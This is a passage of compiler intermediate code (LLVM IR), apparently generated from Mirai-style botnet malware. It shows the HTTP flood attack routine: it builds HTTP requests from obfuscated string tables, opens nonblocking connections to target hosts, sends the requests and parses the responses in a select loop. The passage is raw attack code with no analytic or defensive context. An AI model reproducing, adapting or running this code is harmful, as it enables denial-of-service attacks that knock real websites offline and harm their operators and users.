  %84 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 9, i64 0
  %85 = tail call i32 @util_strcpy(i8* %84, i8* %15) #10
  %86 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 7, i64 0
  %87 = tail call i32 @util_strcpy(i8* %86, i8* %16) #10
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %69, i32 2
  %89 = load i8, i8* %88, align 4
  %90 = icmp ult i8 %89, 32
  br i1 %90, label %91, label %95

; <label>:91:                                     ; preds = %81
  %92 = load i32, i32* %70, align 4
  %93 = tail call i32 @ntohl(i32 %92) #11
  %94 = tail call i32 @htonl(i32 %93) #11
  store i32 %94, i32* %72, align 4
  br label %95

; <label>:95:                                     ; preds = %91, %81
  tail call void @table_unlock_val(i8 zeroext 54)
  %96 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %97 = tail call i8* @table_retrieve_val(i32 54, i32* null)
  %98 = tail call i32 @util_strcpy(i8* %96, i8* %97) #10
  tail call void @table_lock_val(i8 zeroext 54)
  %99 = tail call i32 @util_strcpy(i8* %73, i8* %17) #10
  %indvars.iv.next662 = add nuw nsw i64 %indvars.iv661, 1
  %100 = icmp slt i64 %indvars.iv.next662, %48
  br i1 %100, label %64, label %.preheader595.loopexit

.backedge596.loopexit:                            ; preds = %.loopexit591
  br label %.backedge596.backedge

.backedge596:                                     ; preds = %.backedge596.backedge, %.preheader595
  %101 = call i64 @time(i64* null) #10
  %102 = trunc i64 %101 to i32
  %103 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %53) #10, !srcloc !1
  %104 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %54) #10, !srcloc !2
  br i1 %51, label %.lr.ph615.preheader, label %.backedge596.backedge

.lr.ph615.preheader:                              ; preds = %.backedge596
  br label %.lr.ph615

.lr.ph615:                                        ; preds = %.lr.ph615.preheader, %373
  %indvars.iv = phi i64 [ %indvars.iv.next, %373 ], [ 0, %.lr.ph615.preheader ]
  %.0530612 = phi i32 [ %.1531, %373 ], [ 0, %.lr.ph615.preheader ]
  %105 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv
  %106 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 1
  %107 = load i8, i8* %106, align 4
  %108 = icmp eq i8 %107, 1
  br i1 %108, label %109, label %113

; <label>:109:                                    ; preds = %.lr.ph615
  %110 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 12
  %111 = load i32, i32* %110, align 4
  %112 = icmp ne i32 %111, 0
  %.sink = select i1 %112, i8 4, i8 0
  store i8 %.sink, i8* %106, align 4
  br label %113

; <label>:113:                                    ; preds = %109, %.lr.ph615
  %114 = phi i8 [ %.sink, %109 ], [ %107, %.lr.ph615 ]
  switch i8 %114, label %369 [
    i8 0, label %115
    i8 2, label %147
    i8 4, label %169
    i8 6, label %330
    i8 7, label %343
    i8 10, label %356
  ]

; <label>:115:                                    ; preds = %113
  call void @llvm.memset.p0i8.i64(i8* nonnull %56, i8 0, i64 16, i32 4, i1 false)
  %116 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %117 = load i32, i32* %116, align 4
  %118 = icmp eq i32 %117, -1
  br i1 %118, label %121, label %119

; <label>:119:                                    ; preds = %115
  %120 = call i32 @close(i32 %117) #10
  br label %121

; <label>:121:                                    ; preds = %115, %119
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #10
  store i32 %122, i32* %116, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %373, label %124

; <label>:124:                                    ; preds = %121
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %122, i32 3, i32 0) #10
  %126 = or i32 %125, 2048
  %127 = call i32 (i32, i32, ...) @fcntl(i32 %122, i32 4, i32 %126) #10
  store i32 65535, i32* %5, align 4
  %128 = load i32, i32* %116, align 4
  %129 = call i32 @setsockopt(i32 %128, i32 0, i32 8, i8* nonnull %57, i32 4) #10
  store i16 2, i16* %58, align 4
  %130 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 4
  %131 = load i32, i32* %130, align 4
  store i32 %131, i32* %59, align 4
  %132 = call zeroext i16 @htons(i16 zeroext %20) #11
  store i16 %132, i16* %60, align 2
  %133 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  store i32 %102, i32* %133, align 4
  store i8 2, i8* %106, align 4
  %134 = load i32, i32* %116, align 4
  %135 = call i32 @connect(i32 %134, %struct.sockaddr* nonnull %61, i32 16) #10
  %136 = load i32, i32* %116, align 4
  %137 = srem i32 %136, 64
  %138 = zext i32 %137 to i64
  %139 = shl i64 1, %138
  %140 = sdiv i32 %136, 64
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %141
  %143 = load i64, i64* %142, align 8
  %144 = or i64 %139, %143
  store i64 %144, i64* %142, align 8
  %145 = icmp sgt i32 %136, %.0530612
  %146 = add nsw i32 %136, 1
  %..0530 = select i1 %145, i32 %146, i32 %.0530612
  br label %373

; <label>:147:                                    ; preds = %113
  %148 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  %149 = load i32, i32* %148, align 4
  %150 = sub i32 %102, %149
  %151 = icmp ugt i32 %150, 30
  br i1 %151, label %152, label %156

; <label>:152:                                    ; preds = %147
  store i8 0, i8* %106, align 4
  %153 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @close(i32 %154) #10
  store i32 -1, i32* %153, align 4
  br label %373

; <label>:156:                                    ; preds = %147
  %157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %158 = load i32, i32* %157, align 4
  %159 = srem i32 %158, 64
  %160 = zext i32 %159 to i64
  %161 = shl i64 1, %160
  %162 = sdiv i32 %158, 64
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %163
  %165 = load i64, i64* %164, align 8
  %166 = or i64 %161, %165
  store i64 %166, i64* %164, align 8
  %167 = icmp sgt i32 %158, %.0530612
  %168 = add nsw i32 %158, 1
  %..0530550 = select i1 %167, i32 %168, i32 %.0530612
  br label %373

; <label>:169:                                    ; preds = %113
  %170 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 14
  store i32 -1, i32* %170, align 4
  %171 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 11
  store i32 0, i32* %171, align 4
  %172 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 18, i64 0
  call void @util_zero(i8* %172, i32 1024) #10
  %173 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 17
  store i32 0, i32* %173, align 4
  call void @util_zero(i8* nonnull %62, i32 10240) #10
  %174 = call i32 @util_strlen(i8* nonnull %62) #10
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %175
  %177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 9, i64 0
  %178 = call i32 @util_strcpy(i8* %176, i8* %177) #10
  %179 = call i32 @util_strlen(i8* nonnull %62) #10
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %180
  %182 = call i32 @util_strcpy(i8* %181, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0)) #10
  %183 = call i32 @util_strlen(i8* nonnull %62) #10
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %184
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 6, i64 0
  %187 = call i32 @util_strcpy(i8* %185, i8* %186) #10
  %188 = call i32 @util_strlen(i8* nonnull %62) #10
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %189
  %191 = call i32 @util_strcpy(i8* %190, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0)) #10
  %192 = call i32 @util_strlen(i8* nonnull %62) #10
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %193
  %195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 5, i64 0
  %196 = call i32 @util_strcpy(i8* %194, i8* %195) #10
  %197 = call i32 @util_strlen(i8* nonnull %62) #10
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %198
  %200 = call i32 @util_strcpy(i8* %199, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0)) #10
  %201 = call i32 @util_strlen(i8* nonnull %62) #10
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %202
  %204 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 7, i64 0
  %205 = call i32 @util_strcpy(i8* %203, i8* %204) #10
  %206 = call i32 @util_strlen(i8* nonnull %62) #10
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %207
  %209 = call i32 @util_strcpy(i8* %208, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  call void @table_unlock_val(i8 zeroext 39)
  %210 = call i32 @util_strlen(i8* nonnull %62) #10
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %211
  %213 = call i8* @table_retrieve_val(i32 39, i32* null)
  %214 = call i32 @util_strcpy(i8* %212, i8* %213) #10
  call void @table_lock_val(i8 zeroext 39)
  %215 = call i32 @util_strlen(i8* nonnull %62) #10
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %216
  %218 = call i32 @util_strcpy(i8* %217, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  call void @table_unlock_val(i8 zeroext 40)
  %219 = call i32 @util_strlen(i8* nonnull %62) #10
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %220
  %222 = call i8* @table_retrieve_val(i32 40, i32* null)
  %223 = call i32 @util_strcpy(i8* %221, i8* %222) #10
  call void @table_lock_val(i8 zeroext 40)
  %224 = call i32 @util_strlen(i8* nonnull %62) #10
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %225
  %227 = call i32 @util_strcpy(i8* %226, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  call void @table_unlock_val(i8 zeroext 41)
  %228 = call i32 @util_strlen(i8* nonnull %62) #10
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %229
  %231 = call i8* @table_retrieve_val(i32 41, i32* null)
  %232 = call i32 @util_strcpy(i8* %230, i8* %231) #10
  call void @table_lock_val(i8 zeroext 41)
  %233 = call i32 @util_strlen(i8* nonnull %62) #10
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %234
  %236 = call i32 @util_strcpy(i8* %235, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  br i1 %63, label %237, label %265

; <label>:237:                                    ; preds = %169
  call void @table_unlock_val(i8 zeroext 42)
  %238 = call i32 @util_strlen(i8* nonnull %62) #10
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %239
  %241 = call i8* @table_retrieve_val(i32 42, i32* null)
  %242 = call i32 @util_strcpy(i8* %240, i8* %241) #10
  call void @table_lock_val(i8 zeroext 42)
  %243 = call i32 @util_strlen(i8* nonnull %62) #10
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %244
  %246 = call i32 @util_strcpy(i8* %245, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  %247 = call i32 @util_strlen(i8* nonnull %62) #10
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %248
  %250 = call i8* @table_retrieve_val(i32 47, i32* null)
  %251 = call i32 @util_strcpy(i8* %249, i8* %250) #10
  %252 = call i32 @util_strlen(i8* nonnull %62) #10
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %253
  %255 = call i32 @util_strcpy(i8* %254, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0)) #10
  %256 = call i32 @util_strlen(i8* nonnull %14) #10
  %257 = call i32 @util_strlen(i8* nonnull %62) #10
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %258
  %260 = call i8* @util_itoa(i32 %256, i32 10, i8* %259) #10
  %261 = call i32 @util_strlen(i8* nonnull %62) #10
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %262
  %264 = call i32 @util_strcpy(i8* %263, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  br label %265

; <label>:265:                                    ; preds = %237, %169
  %266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 15
  %267 = load i32, i32* %266, align 4
  %268 = icmp sgt i32 %267, 0
  br i1 %268, label %269, label %296

; <label>:269:                                    ; preds = %265
  %270 = call i32 @util_strlen(i8* nonnull %62) #10
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %271
  %273 = call i32 @util_strcpy(i8* %272, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0)) #10
  store i32 0, i32* %5, align 4
  %274 = load i32, i32* %266, align 4
  %275 = icmp sgt i32 %274, 0
  %276 = call i32 @util_strlen(i8* nonnull %62) #10
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %277
  br i1 %275, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %269
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %279 = phi i8* [ %294, %.lr.ph ], [ %278, %.lr.ph.preheader ]
  %280 = load i32, i32* %5, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 16, i64 %281, i64 0
  %283 = call i32 @util_strcpy(i8* %279, i8* %282) #10
  %284 = call i32 @util_strlen(i8* nonnull %62) #10
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %285
  %287 = call i32 @util_strcpy(i8* %286, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0)) #10
  %288 = load i32, i32* %5, align 4
  %289 = add nsw i32 %288, 1
  store i32 %289, i32* %5, align 4
  %290 = load i32, i32* %266, align 4
  %291 = icmp slt i32 %289, %290
  %292 = call i32 @util_strlen(i8* nonnull %62) #10
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %293
  br i1 %291, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %269
  %.lcssa = phi i8* [ %278, %269 ], [ %294, %._crit_edge.loopexit ]
  %295 = call i32 @util_strcpy(i8* %.lcssa, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  br label %296

; <label>:296:                                    ; preds = %._crit_edge, %265
  %297 = call i32 @util_strlen(i8* nonnull %62) #10
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %298
  %300 = call i32 @util_strcpy(i8* %299, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #10
  br i1 %63, label %301, label %306

; <label>:301:                                    ; preds = %296
  %302 = call i32 @util_strlen(i8* nonnull %62) #10
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %303
  %305 = call i32 @util_strcpy(i8* %304, i8* nonnull %14) #10
  br label %306

; <label>:306:                                    ; preds = %301, %296
  %307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 10, i64 0
  %308 = call signext i8 @util_strcmp(i8* nonnull %177, i8* %307) #10
  %309 = icmp eq i8 %308, 0
  br i1 %309, label %310, label %312

; <label>:310:                                    ; preds = %306
  %311 = call i32 @util_strcpy(i8* nonnull %177, i8* %307) #10
  br label %312

; <label>:312:                                    ; preds = %306, %310
  %313 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %314 = load i32, i32* %313, align 4
  %315 = call i32 @util_strlen(i8* nonnull %62) #10
  %316 = sext i32 %315 to i64
  %317 = call i64 @send(i32 %314, i8* nonnull %62, i64 %316, i32 16384) #10
  %318 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 3
  store i32 %102, i32* %318, align 4
  store i8 6, i8* %106, align 4
  %319 = load i32, i32* %313, align 4
  %320 = srem i32 %319, 64
  %321 = zext i32 %320 to i64
  %322 = shl i64 1, %321
  %323 = sdiv i32 %319, 64
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %324
  %326 = load i64, i64* %325, align 8
  %327 = or i64 %322, %326
  store i64 %327, i64* %325, align 8
  %328 = icmp sgt i32 %319, %.0530612
  %329 = add nsw i32 %319, 1
  %..0530551 = select i1 %328, i32 %329, i32 %.0530612
  br label %373

; <label>:330:                                    ; preds = %113
  %331 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %332 = load i32, i32* %331, align 4
  %333 = srem i32 %332, 64
  %334 = zext i32 %333 to i64
  %335 = shl i64 1, %334
  %336 = sdiv i32 %332, 64
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %337
  %339 = load i64, i64* %338, align 8
  %340 = or i64 %335, %339
  store i64 %340, i64* %338, align 8
  %341 = icmp sgt i32 %332, %.0530612
  %342 = add nsw i32 %332, 1
  %..0530552 = select i1 %341, i32 %342, i32 %.0530612
  br label %373

; <label>:343:                                    ; preds = %113
  %344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %345 = load i32, i32* %344, align 4
  %346 = srem i32 %345, 64
  %347 = zext i32 %346 to i64
  %348 = shl i64 1, %347
  %349 = sdiv i32 %345, 64
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %350
  %352 = load i64, i64* %351, align 8
  %353 = or i64 %348, %352
  store i64 %353, i64* %351, align 8
  %354 = icmp sgt i32 %345, %.0530612
  %355 = add nsw i32 %345, 1
  %..0530553 = select i1 %354, i32 %355, i32 %.0530612
  br label %373

; <label>:356:                                    ; preds = %113
  %357 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %358 = load i32, i32* %357, align 4
  %359 = srem i32 %358, 64
  %360 = zext i32 %359 to i64
  %361 = shl i64 1, %360
  %362 = sdiv i32 %358, 64
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %363
  %365 = load i64, i64* %364, align 8
  %366 = or i64 %361, %365
  store i64 %366, i64* %364, align 8
  %367 = icmp sgt i32 %358, %.0530612
  %368 = add nsw i32 %358, 1
  %..0530554 = select i1 %367, i32 %368, i32 %.0530612
  br label %373

; <label>:369:                                    ; preds = %113
  store i8 0, i8* %106, align 4
  %370 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %105, i64 0, i32 0
  %371 = load i32, i32* %370, align 4
  %372 = call i32 @close(i32 %371) #10
  store i32 -1, i32* %370, align 4
  br label %373

; <label>:373:                                    ; preds = %356, %343, %330, %312, %156, %124, %369, %121, %152
  %.1531 = phi i32 [ %.0530612, %121 ], [ %.0530612, %152 ], [ %.0530612, %369 ], [ %..0530, %124 ], [ %..0530550, %156 ], [ %..0530551, %312 ], [ %..0530552, %330 ], [ %..0530553, %343 ], [ %..0530554, %356 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %374 = icmp slt i64 %indvars.iv.next, %48
  br i1 %374, label %.lr.ph615, label %._crit_edge616

._crit_edge616:                                   ; preds = %373
  %375 = icmp eq i32 %.1531, 0
  br i1 %375, label %.backedge596.backedge, label %376

.backedge596.backedge:                            ; preds = %._crit_edge616, %376, %.backedge596, %.backedge596.loopexit
  br label %.backedge596

; <label>:376:                                    ; preds = %._crit_edge616
  store <2 x i64> <i64 1, i64 0>, <2 x i64>* %9, align 16
  %377 = call i32 @select(i32 %.1531, %struct.fd_set* nonnull %7, %struct.fd_set* nonnull %8, %struct.fd_set* null, %struct.timeval* nonnull %tmpcast) #10
  %378 = call i64 @time(i64* null) #10
  %379 = trunc i64 %378 to i32
  %380 = icmp slt i32 %377, 1
  %brmerge = or i1 %380, %.not
  br i1 %brmerge, label %.backedge596.backedge, label %.lr.ph633.preheader

.lr.ph633.preheader:                              ; preds = %376
  br label %.lr.ph633

.lr.ph633:                                        ; preds = %.lr.ph633.preheader, %.loopexit591
  %indvars.iv659 = phi i64 [ %indvars.iv.next660, %.loopexit591 ], [ 0, %.lr.ph633.preheader ]
  %381 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 0
  %382 = load i32, i32* %381, align 4
  %383 = icmp eq i32 %382, -1
  br i1 %383, label %.loopexit591, label %384

; <label>:384:                                    ; preds = %.lr.ph633
  %385 = sdiv i32 %382, 64
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %386
  %388 = load i64, i64* %387, align 8
  %389 = srem i32 %382, 64
  %390 = zext i32 %389 to i64
  %391 = shl i64 1, %390
  %392 = and i64 %388, %391
  %393 = icmp eq i64 %392, 0
  br i1 %393, label %405, label %394

; <label>:394:                                    ; preds = %384
  store i32 0, i32* %12, align 4
  store i32 4, i32* %13, align 4
  %395 = call i32 @getsockopt(i32 %382, i32 1, i32 4, i8* nonnull %55, i32* nonnull %13) #10
  %396 = load i32, i32* %12, align 4
  %397 = or i32 %396, %395
  %398 = icmp eq i32 %397, 0
  br i1 %398, label %399, label %401

; <label>:399:                                    ; preds = %394
  %400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  store i8 4, i8* %400, align 4
  %.pre663 = load i32, i32* %381, align 4
  br label %405

; <label>:401:                                    ; preds = %394
  %402 = load i32, i32* %381, align 4
  %403 = call i32 @close(i32 %402) #10
  store i32 -1, i32* %381, align 4
  %404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  store i8 0, i8* %404, align 4
  br label %.loopexit591

; <label>:405:                                    ; preds = %384, %399
  %406 = phi i32 [ %382, %384 ], [ %.pre663, %399 ]
  %407 = sdiv i32 %406, 64
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %408
  %410 = load i64, i64* %409, align 8
  %411 = srem i32 %406, 64
  %412 = zext i32 %411 to i64
  %413 = shl i64 1, %412
  %414 = and i64 %413, %410
  %415 = icmp eq i64 %414, 0
  br i1 %415, label %.loopexit591, label %416

; <label>:416:                                    ; preds = %405
  %417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  %418 = load i8, i8* %417, align 4
  switch i8 %418, label %.loopexit591 [
    i8 6, label %427
    i8 7, label %.preheader590
    i8 10, label %.preheader592.preheader
  ]

.preheader592.preheader:                          ; preds = %416
  br label %.preheader592

.preheader590:                                    ; preds = %416
  %419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 17
  %420 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 0
  %421 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 64
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 2
  %423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 14
  %424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  %425 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 13
  %426 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 15
  br label %878

; <label>:427:                                    ; preds = %416
  call void @util_zero(i8* nonnull %21, i32 10240) #10
  %428 = load i32, i32* %381, align 4
  %429 = call i64 @recv(i32 %428, i8* nonnull %21, i64 10240, i32 16386) #10
  %430 = trunc i64 %429 to i32
  %431 = icmp slt i32 %430, 1
  br i1 %431, label %432, label %435

; <label>:432:                                    ; preds = %427
  %433 = load i32, i32* %381, align 4
  %434 = call i32 @close(i32 %433) #10
  store i32 -1, i32* %381, align 4
  store i8 0, i8* %417, align 4
  br label %.loopexit591

; <label>:435:                                    ; preds = %427
  %436 = call i32 @util_memsearch(i8* nonnull %21, i32 %430, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %437 = icmp eq i32 %436, -1
  %438 = icmp slt i32 %430, 10240
  %or.cond5 = and i1 %438, %437
  br i1 %or.cond5, label %.loopexit591, label %439

; <label>:439:                                    ; preds = %435
  %440 = sext i32 %436 to i64
  %441 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %440
  store i8 0, i8* %441, align 1
  %442 = call i8* @table_retrieve_val(i32 53, i32* null)
  %443 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %442) #10
  %444 = icmp eq i32 %443, -1
  br i1 %444, label %447, label %445

; <label>:445:                                    ; preds = %439
  %446 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  store i32 2, i32* %446, align 4
  br label %447

; <label>:447:                                    ; preds = %439, %445
  %448 = call i8* @table_retrieve_val(i32 52, i32* null)
  %449 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %448) #10
  %450 = icmp eq i32 %449, -1
  br i1 %450, label %453, label %451

; <label>:451:                                    ; preds = %447
  %452 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  store i32 1, i32* %452, align 4
  br label %453

; <label>:453:                                    ; preds = %447, %451
  %454 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 12
  store i32 0, i32* %454, align 4
  %455 = call i8* @table_retrieve_val(i32 51, i32* null)
  %456 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %455) #10
  %457 = icmp eq i32 %456, -1
  br i1 %457, label %482, label %458

; <label>:458:                                    ; preds = %453
  %459 = call i8* @table_retrieve_val(i32 51, i32* null)
  %460 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %459) #10
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %461
  %463 = load i8, i8* %462, align 1
  %464 = icmp eq i8 %463, 32
  %465 = zext i1 %464 to i32
  %.555 = add nsw i32 %465, %460
  %466 = sext i32 %.555 to i64
  %467 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %466
  %468 = sub nsw i32 %430, %.555
  %469 = call i32 @util_memsearch(i8* %467, i32 %468, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
